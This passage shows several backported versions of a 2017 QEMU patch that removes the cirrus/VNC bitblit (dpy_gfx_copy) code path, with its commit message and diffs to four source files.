-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (VNC_DIRTY_PIXELS_PER_BIT - (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-    if (w_lim < 0) {
-        w_lim = w;
-    } else {
-        w_lim = w - (w_lim % VNC_DIRTY_PIXELS_PER_BIT);
-    }
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
-            } else if (!x) {
-                s = (VNC_DIRTY_PIXELS_PER_BIT -
-                    (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-                s = MIN(s, w_lim);
-            } else {
-                s = VNC_DIRTY_PIXELS_PER_BIT;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / VNC_DIRTY_PIXELS_PER_BIT),
-                            vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -3118,7 +3019,6 @@ static gboolean vnc_listen_io(QIOChannel *ioc,
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name             = "vnc",
     .dpy_refresh          = vnc_refresh,
-    .dpy_gfx_copy         = vnc_dpy_copy,
     .dpy_gfx_update       = vnc_dpy_update,
     .dpy_gfx_switch       = vnc_dpy_switch,
     .dpy_gfx_check_format = qemu_pixman_check_format,
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From 6633eca887995b05803404e0a685c6f71126cec4 Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 12 ++-----
 include/ui/console.h    |  8 -----
 ui/console.c            | 28 ---------------
 ui/vnc.c                | 96 -------------------------------------------------
 4 files changed, 3 insertions(+), 141 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index d0f0179..d46dd64 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -755,11 +755,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vga.vram_ptr +
@@ -768,10 +763,9 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index 98edf41..49222f0 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -159,10 +159,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
-
     void (*dpy_text_cursor)(DisplayChangeListener *dcl,
                             int x, int y);
     void (*dpy_text_resize)(DisplayChangeListener *dcl,
@@ -216,8 +212,6 @@ void unregister_displaychangelistener(DisplayChangeListener *dcl);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -295,8 +289,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 DisplayState *qemu_console_displaystate(QemuConsole *console);
 
diff --git a/ui/console.c b/ui/console.c
index e3e8297..a48e4b9 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1438,27 +1438,6 @@ void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -1830,13 +1809,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index abdc932..48d4b8b 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -417,7 +417,6 @@ out_error:
 */
 
 static int vnc_update_client(VncState *vs, int has_dirty);
-static int vnc_update_client_sync(VncState *vs, int has_dirty);
 static void vnc_disconnect_start(VncState *vs);
 
 static void vnc_colordepth(VncState *vs);
@@ -721,93 +720,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client_sync(vs, 1);
-            /* vs might be free()ed here */
-        }
-    }
-
-    /* do bitblit op on the local surface too */
-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (16 - (dst_x % 16));
-    if (w_lim < 0)
-        w_lim = w;
-    else
-        w_lim = w - (w_lim % 16);
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
-            } else if (!x) {
-                s = (16 - (dst_x % 16));
-                s = MIN(s, w_lim);
-            } else {
-                s = 16;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / 16), vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -873,13 +785,6 @@ static int find_and_clear_dirty_height(struct VncState *vs,
     return h;
 }
 
-static int vnc_update_client_sync(VncState *vs, int has_dirty)
-{
-    int ret = vnc_update_client(vs, has_dirty);
-    vnc_jobs_join(vs);
-    return ret;
-}
-
 static int vnc_update_client(VncState *vs, int has_dirty)
 {
     if (vs->need_update && vs->csock != -1) {
@@ -2920,7 +2825,6 @@ static void vnc_listen_websocket_read(void *opaque)
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name          = "vnc",
     .dpy_refresh       = vnc_refresh,
-    .dpy_gfx_copy      = vnc_dpy_copy,
     .dpy_gfx_update    = vnc_dpy_update,
     .dpy_gfx_switch    = vnc_dpy_switch,
     .dpy_mouse_set     = vnc_mouse_set,
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From c85f4df08b17f5808eda2b8afea1e4db7016cdc8 Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 12 ++-----
 include/ui/console.h    |  8 -----
 ui/console.c            | 28 ---------------
 ui/vnc.c                | 91 -------------------------------------------------
 4 files changed, 3 insertions(+), 136 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index d643a0d..2e38c86 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -756,11 +756,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vga.vram_ptr +
@@ -769,10 +764,9 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index 22ef8ca..331c07a 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -158,10 +158,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
-
     void (*dpy_text_cursor)(DisplayChangeListener *dcl,
                             int x, int y);
     void (*dpy_text_resize)(DisplayChangeListener *dcl,
@@ -223,8 +219,6 @@ int dpy_set_ui_info(QemuConsole *con, QemuUIInfo *info);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -315,8 +309,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 DisplayState *qemu_console_displaystate(QemuConsole *console);
 
diff --git a/ui/console.c b/ui/console.c
index 258af5d..cc1aa20 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1450,27 +1450,6 @@ static void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -1968,13 +1947,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index 76caa897..c3c2625 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -733,96 +733,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client(vs, 1, true);
-            /* vs might be free()ed here */
-        }
-    }
-
-    /* do bitblit op on the local surface too */
-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (VNC_DIRTY_PIXELS_PER_BIT - (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-    if (w_lim < 0) {
-        w_lim = w;
-    } else {
-        w_lim = w - (w_lim % VNC_DIRTY_PIXELS_PER_BIT);
-    }
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
-            } else if (!x) {
-                s = (VNC_DIRTY_PIXELS_PER_BIT -
-                    (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-                s = MIN(s, w_lim);
-            } else {
-                s = VNC_DIRTY_PIXELS_PER_BIT;
-            }
-            cmp_bytes = s * VNC_SERVER_FB_BYTES;
-            if (memcmp(src_row, dst_row, cmp_bytes) == 0)
-                continue;
-            memmove(dst_row, src_row, cmp_bytes);
-            QTAILQ_FOREACH(vs, &vd->clients, next) {
-                if (!vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-                    set_bit(((x + dst_x) / VNC_DIRTY_PIXELS_PER_BIT),
-                            vs->dirty[y]);
-                }
-            }
-        }
-        src_row += pitch - w * VNC_SERVER_FB_BYTES;
-        dst_row += pitch - w * VNC_SERVER_FB_BYTES;
-        y += inc;
-    }
-
-    QTAILQ_FOREACH(vs, &vd->clients, next) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vnc_copy(vs, src_x, src_y, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 static void vnc_mouse_set(DisplayChangeListener *dcl,
                           int x, int y, int visible)
 {
@@ -2949,7 +2859,6 @@ static void vnc_listen_websocket_read(void *opaque)
 static const DisplayChangeListenerOps dcl_ops = {
     .dpy_name          = "vnc",
     .dpy_refresh       = vnc_refresh,
-    .dpy_gfx_copy      = vnc_dpy_copy,
     .dpy_gfx_update    = vnc_dpy_update,
     .dpy_gfx_switch    = vnc_dpy_switch,
     .dpy_mouse_set     = vnc_mouse_set,
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From 9de536fbc2be97ae887560f08f0fd824efa3d5db Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 12 ++-----
 include/ui/console.h    |  7 ----
 ui/console.c            | 28 ---------------
 ui/vnc.c                | 91 -------------------------------------------------
 4 files changed, 3 insertions(+), 135 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 5901250..2841676 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -758,11 +758,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vga.vram_ptr +
@@ -771,10 +766,9 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index 047a2b4..ed07065 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -166,9 +166,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
     bool (*dpy_gfx_check_format)(DisplayChangeListener *dcl,
                                  pixman_format_code_t format);
 
@@ -233,8 +230,6 @@ int dpy_set_ui_info(QemuConsole *con, QemuUIInfo *info);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -329,8 +324,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 
 /* console-gl.c */
diff --git a/ui/console.c b/ui/console.c
index 75fc492..72d91cb 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1495,27 +1495,6 @@ static void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -1968,13 +1947,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index 52c6809..61ab611 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -908,96 +908,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client(vs, 1, true);
-            /* vs might be free()ed here */
-        }
-    }
-
-    /* do bitblit op on the local surface too */
-    pitch = vnc_server_fb_stride(vd);
-    src_row = vnc_server_fb_ptr(vd, src_x, src_y);
-    dst_row = vnc_server_fb_ptr(vd, dst_x, dst_y);
-    y = dst_y;
-    inc = 1;
-    if (dst_y > src_y) {
-        /* copy backwards */
-        src_row += pitch * (h-1);
-        dst_row += pitch * (h-1);
-        pitch = -pitch;
-        y = dst_y + h - 1;
-        inc = -1;
-    }
-    w_lim = w - (VNC_DIRTY_PIXELS_PER_BIT - (dst_x % VNC_DIRTY_PIXELS_PER_BIT));
-    if (w_lim < 0) {
-        w_lim = w;
-    } else {
-        w_lim = w - (w_lim % VNC_DIRTY_PIXELS_PER_BIT);
-    }
-    for (i = 0; i < h; i++) {
-        for (x = 0; x <= w_lim;
-                x += s, src_row += cmp_bytes, dst_row += cmp_bytes) {
-            if (x == w_lim) {
-                if ((s = w - w_lim) == 0)
-                    break;
